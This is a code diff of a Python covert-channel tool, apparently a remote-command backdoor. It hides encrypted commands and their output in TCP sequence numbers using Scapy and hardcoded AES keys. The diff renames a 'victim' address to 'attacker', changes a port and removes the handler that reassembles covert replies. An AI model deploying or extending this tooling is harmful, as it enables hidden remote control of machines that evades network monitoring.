@@ -23,11 +23,11 @@ TTL=234
 encryptionKey = "passyourwordssss"
 iv = Random.new().read(AES.block_size)
 IV = "whatsthedealwith"
-victim=("0.0.0.0",9999)
+attacker=("0.0.0.0",9999)
 messages = []
 authentication ="1337"
 
-myip=("192.168.0.3",66)
+myip=("192.168.0.3",9999)
 
 def secret_send(msg:str, type:str='command'):
     '''
@@ -149,44 +149,6 @@ def client():
             # The time-out has been set to 10 seconds so as to allow enough time
             # for responses to large commands (i.e. iptables -L ) to return.
             sniff(timeout=10, filter="ip", prn=handle)
-
-def handle(packet):
-    #Only handle a packet if it contains an IP layer.
-    if(packet.haslayer(IP)):
-        # Don't handle any inbound packets that are looping back.
-        if(packet[IP].src != myip[0]):
-            #Authenticate the packet based on the pre-defined characteristics.
-            if(authenticate(packet)):
-                #Decrypt the payload and split on the newline characters
-                payload = decrypt(packet["Raw"].load).split("\n")
-                UID = payload[1]
-                position = payload[2].split(":")[0]
-                total = payload[2].split(":")[1]
-                #Handle packet based on TCP rules
-                if(packet.haslayer(TCP)):
-                    length = 32
-                    # Convert to binary
-                    field = packet[TCP].seq
-                    #Converts the bits to the nearest divisible by 8
-                    covertContent = lengthChecker(field)
-                #If there's more than one message associated with this
-                #transmission, add it to our list of messages.
-                if(total != 1):
-                    #DEBUG: print "Multipart command, add to messages"
-                    addToMessages(messages, UID, total, covertContent)
-                    # Each time a message is added, check to see if the max/end
-                    # of the transmission has been reached. e.g. message 3 out
-                    # of 3
-                    # If the max has been reached
-                    if(checkMessages(UID)):
-                        #Reconstruct the message
-                        message = reconstructMessage(UID)
-                        #Decrypt the full contents of the message here
-                        decryptedMessage = decrypt(message)
-                        #Dispaly the output to the user
-                        print ("OUTPUT: \n " + decryptedMessage)
-                        #Delete the packets belonging to the session from memory
-                        deleteMessages(UID)
 
 def lengthChecker(field):
     covertContent = 0
